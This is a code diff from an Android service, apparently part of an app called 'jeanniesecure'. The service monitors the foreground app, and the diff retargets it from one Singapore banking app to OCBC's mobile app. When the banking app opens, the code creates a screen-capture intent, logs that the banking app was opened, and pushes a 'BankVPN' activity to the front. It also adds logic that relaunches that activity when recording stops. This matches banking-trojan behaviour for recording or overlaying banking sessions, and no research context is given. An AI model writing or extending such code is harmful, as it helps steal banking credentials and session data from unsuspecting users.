@@ -121,24 +121,32 @@ public class ExampleJobIntentService extends JobIntentService {
                 }
             }
             if(currentApp != null){
-                if (currentApp.equals("com.dbs.sg.dbsmbanking") && !redirected) {
+                //com.dbs.sg.dbsmbanking
+                if (currentApp.equals("com.ocbc.mobile") && !redirected) {
                     Log.e(TAG, "iBanking app opened by user!");
                     MediaProjectionManager manager = (MediaProjectionManager)getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                     Intent permissionIntent = manager.createScreenCaptureIntent();
                     redirected = true;
-                    Intent AppIntent  = new Intent(getApplicationContext(), BankVPN.class);
+                    Intent AppIntent  = new Intent(context, BankVPN.class);
                     AppIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     startActivity(AppIntent);
                     onStopCurrentWork();
                 } /*else if (currentApp.equals("com.dbs.sg.dbsmbanking") && redirected) {
                     //do nothing
-                }*/ else if (!currentApp.equals("com.dbs.sg.dbsmbanking") && !currentApp.equals("com.example.jeanniesecure") && !currentApp.equals("com.android.systemui") && redirected){
+                }*/ else if (!currentApp.equals("com.ocbc.mobile") && !currentApp.equals("com.example.jeanniesecure") && !currentApp.equals("com.android.systemui") && redirected){
                     redirected = false;
                     Log.d(TAG, "Stop Recording ");
+                    Intent AppIntent  = new Intent(getApplicationContext(), BankVPN.class);
+                    AppIntent.setFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(AppIntent);
+                    /*
+                    AppIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    AppIntent.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+                    */
                 }
                 Log.e(TAG, "Current App in foreground is: " + currentApp);
                 return currentApp;
-                }
+            }
             return currentApp;
             }
         else {
